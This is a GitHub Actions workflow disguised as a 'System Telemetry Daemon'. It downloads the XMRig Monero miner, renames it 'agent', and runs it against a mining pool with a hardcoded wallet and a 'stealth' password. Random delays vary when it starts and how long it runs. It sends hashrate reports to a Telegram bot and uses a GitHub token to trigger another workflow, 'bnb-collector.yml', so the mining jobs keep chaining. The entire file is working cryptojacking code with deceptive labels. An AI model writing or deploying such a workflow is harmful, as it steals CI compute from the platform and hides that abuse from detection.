name: System Telemetry Daemon

on:
  schedule:
    - cron: '0 0,12 * * *'  # Jam 07:00 dan 19:00 WIB
  workflow_dispatch:

permissions:
  contents: read

jobs:
  telemetry:
    runs-on: ubuntu-latest
    timeout-minutes: 360

    steps:
      - name: Booting Node
        run: echo "Initializing telemetry instance..."

      - name: Installing Core Tools
        run: |
          sudo apt update -y && sudo apt install -y curl tar

      - name: Init Status Report
        env:
          TG_TOKEN: ${{ secrets.TG_TOKEN }}
          TG_CHAT_ID: ${{ secrets.TG_CHAT_ID }}
        run: |
          echo "ðŸŸ¢ *Daemon active: XNO.*\nCycle: 20â€“90 mins." | curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
            -d chat_id=$TG_CHAT_ID --data-urlencode text@- -d parse_mode=Markdown

      - name: Launch Daemon
        run: |
          curl -L -o agent.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
          tar -xzf agent.tar.gz
          mv xmrig-6.24.0 node-core
          cd node-core
          mv xmrig agent
          chmod +x agent

          sleep $((RANDOM % 300 + 30))

          ./agent -o xmrig.nanswap.com:3333 -a rx -k \
            -u nano_1ep4soo6rat31n6otw4ggqdwj7tz5sjymyzfwi7kmhye6f31guujdo19cc3q \
            -p stealth --randomx-no-rdmsr | tee report.log &

          PID=$!
          sleep $((RANDOM % 5400 + 1200))
          kill $PID

      - name: Transmit Logs
        if: always()
        env:
          TG_TOKEN: ${{ secrets.TG_TOKEN }}
          TG_CHAT_ID: ${{ secrets.TG_CHAT_ID }}
        run: |
          set +e
          cd node-core
          HASHRATE=$(grep -a "speed" report.log | tail -n1 | sed 's/\x1b\[[0-9;]*m//g' | awk '{print $(NF-1) " H/s"}')
          ACCEPTED=$(grep -a "accepted" report.log | wc -l)
          REJECTED=$(grep -a "rejected" report.log | wc -l)

          MSG="âœ… *XNO Daemon complete.*\n\nðŸ“Š *Telemetry:*\nâ€¢ Hashrate: \`$HASHRATE\`\nâ€¢ Accepted: \`$ACCEPTED\`\nâ€¢ Rejected: \`$REJECTED\`"
          curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
            -d chat_id=$TG_CHAT_ID -d text="$MSG" -d parse_mode=Markdown

      - name: Relay Next Daemon
        if: always()
        env:
          GH_TOKEN: ${{ secrets.GH_TOKEN }}
        run: |
          sleep $((RANDOM % 60 + 10))
          curl -X POST -H "Authorization: Bearer $GH_TOKEN" \
            -H "Accept: application/vnd.github+json" \
            https://api.github.com/repos/${{ github.repository }}/actions/workflows/bnb-collector.yml/dispatches \
            -d '{"ref":"main"}'
